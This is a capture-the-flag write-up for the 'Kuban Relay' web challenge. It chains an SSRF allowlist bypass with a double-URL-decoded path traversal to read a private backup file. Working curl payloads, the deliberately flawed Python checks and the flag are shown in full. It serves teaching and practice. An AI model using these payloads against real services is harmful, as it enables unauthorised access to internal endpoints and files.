# Kuban Relay

> **Category:** Web · **Event:** KubSTU CTF 2026 Autumn
> Write-up: KubMail — the archive that remembers everything

## 📌 Task

KubMail is an integration mail/archive service. The flag has to be reached from the public pages: there is no single magic request — you chain an SSRF in the `/api/preview` endpoint with a double-URL-decoding path traversal in the internal archive gateway to read a private backup file.

**Files:** [KubMail_CTF (1).zip](../../../assets/Web/Kuban%20Relay/KubMail_CTF%20%281%29.zip)

## 🏁 Solution

### 1. The exploitation chain

The challenge is solved not with a single request, but with a chain:

```text
публичная страница
  → /api/docs
  → /api/preview (SSRF)
  → /internal/health
  → /internal/debug/routes
  → ticket tram-7-archive
  → /internal/archive/export
  → двойное URL-декодирование
  → path traversal
  → flag
```

### 2. Reconnaissance

The main page has an **API documentation** link. The request:

```bash
curl http://127.0.0.1:5000/api/docs
```

returns:

```json
{
  "name": "KubMail integration API",
  "version": "2.3",
  "endpoints": {
    "preview": "/api/preview?url=<URL>",
    "route": "/api/route?from=&to="
  },
  "preview_note": "Preview accepts approved kubmail.local integration URLs."
}
```

The documentation also contains a hint without disclosing the source code:

```json
"legacy_monitoring": {
  "health_probe": "/internal/health",
  "purpose": "archive gateway availability check"
}
```

This makes the challenge solvable by a blackbox method: the health-probe route does not need to be guessed or found by brute force. The `/api/preview` endpoint is interesting: the server itself makes an HTTP request to a user-supplied URL. This is a sign of SSRF.

### 3. Bypassing the allowlist

The check in the application is written like this:

```python
if 'kubmail.local' not in target:
    return jsonify({'error':'destination is not on the approved integration network'}), 403
```

It checks the whole URL string, not the hostname. Therefore `kubmail.local` can be placed in the URL's query parameter, while the actual destination remains localhost:

```text
http://127.0.0.1:5000/internal/health?via=kubmail.local
```

The external request to the proxy:

```bash
curl --get 'http://127.0.0.1:5000/api/preview' \
  --data-urlencode 'url=http://127.0.0.1:5000/internal/health?via=kubmail.local'
```

The response:

```json
{
  "body": "{\"build\":\"2024.03.17\",\"note\":\"legacy export requires a gateway ticket\",\"routes\":\"/internal/debug/routes\",\"service\":\"krd-archive-gateway\",\"status\":\"ok\"}\n",
  "status": 200
}
```

### 4. Accessing the debug endpoint

From the response we know the path `/internal/debug/routes`. We execute it through the same SSRF:

```bash
curl --get 'http://127.0.0.1:5000/api/preview' \
  --data-urlencode 'url=http://127.0.0.1:5000/internal/debug/routes?via=kubmail.local'
```

The response contains the internal route and the ticket:

```json
{
  "export": {
    "method": "GET",
    "parameter": "name",
    "ticket": "tram-7-archive"
  },
  "routes": [
    "/internal/health",
    "/internal/debug/routes",
    "/internal/archive/export"
  ]
}
```

It is also clear that the internal endpoints trust the `X-Kubmail-Proxy` header, which the SSRF proxy adds automatically.

### 5. Analyzing the archive export

The `/internal/archive/export` endpoint requires a ticket and a `name` parameter:

```python
if request.args.get('ticket') != 'tram-7-archive':
    return jsonify({'error':'invalid gateway ticket'}),401

raw = request.args.get('name','')
name = unquote(raw)
target = (PUBLIC_DIR / name).resolve()
```

Here the error with extra decoding repeats. Unlike the ordinary `/download`, the internal export does not verify that the resulting path stayed inside `data/public`.

### 6. Final traversal

We need to break out of `data/public` into `data/private` and request:

```text
data/private/krd_weather_backup.txt
```

To do this, we pass the name:

```text
%252e%252e%252fprivate%252fkrd_weather_backup.txt
```

The internal endpoint must receive `ticket`, `name` and the `kubmail.local` marker at the same time in order to pass the external proxy's allowlist. The most convenient way is to URL-encode the ampersands inside the nested URL:

```text
http://127.0.0.1:5000/internal/archive/export?ticket=tram-7-archive%26name=%252e%252e%252fprivate%252fkrd_weather_backup.txt%26via=kubmail.local
```

The full command:

```bash
curl --get 'http://127.0.0.1:5000/api/preview' \
  --data-urlencode 'url=http://127.0.0.1:5000/internal/archive/export?ticket=tram-7-archive%26name=%252e%252e%252fprivate%252fkrd_weather_backup.txt%26via=kubmail.local'
```

After decoding the query parameters, the internal request becomes:

```text
/internal/archive/export?ticket=tram-7-archive&name=%2e%2e%2fprivate%2fkrd_weather_backup.txt&via=kubmail.local
```

Flask decodes `%25` at the first level, and `unquote()` in the archive gateway performs the second stage and turns the name into:

```text
../private/krd_weather_backup.txt
```

Path normalization gives:

```text
data/public/../private/krd_weather_backup.txt
→ data/private/krd_weather_backup.txt
```

### 7. Flag

In the response we find:

```text
KubSTU{kuban_legacy_gateway_reads_between_the_lines}
```

**Flag:** `KubSTU{kuban_legacy_gateway_reads_between_the_lines}`
